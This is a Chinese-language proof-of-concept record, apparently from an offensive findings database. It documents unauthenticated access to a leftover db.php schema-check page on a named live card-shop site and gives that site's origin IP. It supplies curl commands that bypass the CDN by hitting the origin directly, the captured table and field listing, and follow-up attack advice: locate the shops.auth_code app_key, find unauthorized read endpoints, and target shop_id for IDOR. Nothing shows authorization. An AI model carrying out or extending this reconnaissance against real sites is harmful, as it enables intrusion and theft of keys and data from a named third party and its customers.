# 自研 PHP 卡商站 /db.php 未删除的数据库结构体检工具：未授权泄露全站表名与关键字段（含 shops.auth_code）

- **code**: php-cardshop-db-php-schema-leak-unauth
- **kind**: poc
- **category**: info-leak
- **component**: 自研 PHP 卡商/寄售商城（建站模板 phpStudy 类骨架，db.php 结构体检脚本）
- **severity**: low
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: task#616 / finding 1280，2026-11-05T23:26Z–23:33Z 在本机 Windows 用 curl.exe 直连源站 103.231.58.20:443 实测：GET /db.php（--resolve 固定域名、--tlsv1.2、无 Cookie/账号/Referer）→ HTTP 200 / 2006 字节，正文为自己渲染的「🩺 数据库结构体检与修复工具」清单，逐行输出「✅ 正常：表 `shops` 包含字段 `auth_code`」等 19 行字段存在性结论，结尾「🎉 数据库结构体检完毕，所有字段均已对齐，请立即删除此文件！」；另用 11 种参数化调用（?action=check/repair/tables、?do=check、?run=1、POST action=check）全部返回同一 2006B / MD5 BE9F64B25F48A8BA91AF45D42E43A35E，证明页面无入参、纯静态结构输出。原始响应落盘 D:\ARTEX\data\tasks\616\i10782\b0.html 与 db_*.html。
- **path**: pocs/php-cardshop-db-php-schema-leak-unauth/poc.sh
- **tags**: db.php,结构体检,未授权,info-leak,表结构泄露,礼品卡,卡商,php,建站工具,备份文件未删
- **created_at**: 2026-11-05T23:42:45.410Z
- **engine**: https://cloud.sktime.cn（源站 103.231.58.20:443）

## 描述

建站/搬站模板自带的数据库结构自检页 db.php 上线后没删：全站任何人 GET 一次即可拿到整库表名与关键字段清单，是后续找 cards/goods/orders 表、以及定位 shops.auth_code（易信SUP 的 app_key）的最短路径。只输出结构、不回真实数据，噪音极低。

## 用法

```
前置：目标可达；无需 Cookie / 账号 / Referer / 任何入参。源站直连常需 --resolve 固定域名并强制 TLS1.2（Windows schannel 默认 TLS1.3 握手会 curl(35)）。

1) 基线（无参）：
curl.exe -sS -k --noproxy "*" --tlsv1.2 --tlsmax 1.2 \
  --resolve TARGET_DOMAIN:443:SOURCE_IP "https://TARGET_DOMAIN/db.php" -o db.html

2) 判据：HTTP 200 且正文含「数据库结构体检」+ 多行「✅ 正常：表 `X` 包含字段 `Y`」，结尾自述「请立即删除此文件」。
3) 静态性负控（区分「固定输出」与「可交互体检」）：带 ?action=check / ?action=repair / ?do=check / ?run=1 及 POST action=check 再取一次，与基线逐字节比对；同长度同 MD5 ⇒ 无入参，不必再试。
4) 失败常见原因：① 直接命中 CDN/WAF 返回站首页 → 加 --resolve 打源站；② curl(35) → 补 --tlsv1.2 --tlsmax 1.2；③ 本机代理污染 → --noproxy "*"。
5) 拿到表结构后优先看 cards/goods/orders 与 shops.auth_code、users.points，再去对应业务页找未授权读接口。
```

## 正文

```
# /db.php 数据库结构体检工具未授权泄露表结构

## 背景
卡商/寄售商城这类自研 PHP 站常用一套带「数据库结构体检与修复」脚本的建站骨架。
运维上线后忘记删除 db.php，于是它成了零鉴权的 schema 广播页。

## 请求
GET /db.php HTTP/1.1
Host: <target-domain>

（实测用 curl：
curl.exe -sS -k --noproxy "*" --tlsv1.2 --tlsmax 1.2 \
  --resolve <domain>:443:<source-ip> "https://<domain>/db.php"）

## 响应（节选，2026-11-05 实测）
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
（2006 字节）

<div ...>🩺 数据库结构体检与修复工具</div>
<div>✅ 正常：表 `users` 包含字段 `points`</div>
<div>✅ 正常：表 `products` 包含字段 `shop_id`</div>
<div>✅ 正常：表 `products` 包含字段 `is_recommend`</div>
<div>✅ 正常：表 `products` 包含字段 `sale_price`</div>
<div>✅ 正常：表 `orders` 包含字段 `shop_id`</div>
<div>✅ 正常：表 `cart` 包含字段 `shop_id`</div>
<div>✅ 正常：表 `recharges` 包含字段 `shop_id`</div>
<div>✅ 正常：表 `withdrawals` 包含字段 `shop_id`</div>
<div>✅ 正常：表 `coupons` 包含字段 `shop_id`</div>
<div>✅ 正常：表 `shops` 包含字段 `auth_code`</div>
<div>✅ 正常：表 `shops` 包含字段 `pay_type`</div>
<div>✅ 正常：表 `shops` 包含字段 `banners`</div>
<div>✅ 正常：表 `shops` 包含字段 `links`</div>
（共 19 行字段存在性结论）
🎉 数据库结构体检完毕，所有字段均已对齐，请立即删除此文件！

## 静态性验证（负控）
以下调用全部返回同一 2006 字节、MD5 = BE9F64B25F48A8BA91AF45D42E43A35E，
与无参基线逐字节一致：
- GET /db.php?action=check
- GET /db.php?action=repair
- GET /db.php?action=tables
- GET /db.php?do=check
- GET /db.php?run=1
- POST /db.php  body: action=check

⇒ 页面不吃任何入参，只输出固定结构，不回表行数与真实数据。
不要期待它给 dump；它的价值是省掉整库表名/字段猜测。

## 判读要点
- 只看「✅ 正常」行即可，这就是完整 schema 白名单。
- 出现 shops.auth_code ⇒ 直接对上易信SUP license 激活链 / app_key 位置。
- 出现 cards/goods/orders + shop_id ⇒ 明确多租户分表模型，后续 IDOR 优先打 shop_id 维度。

```
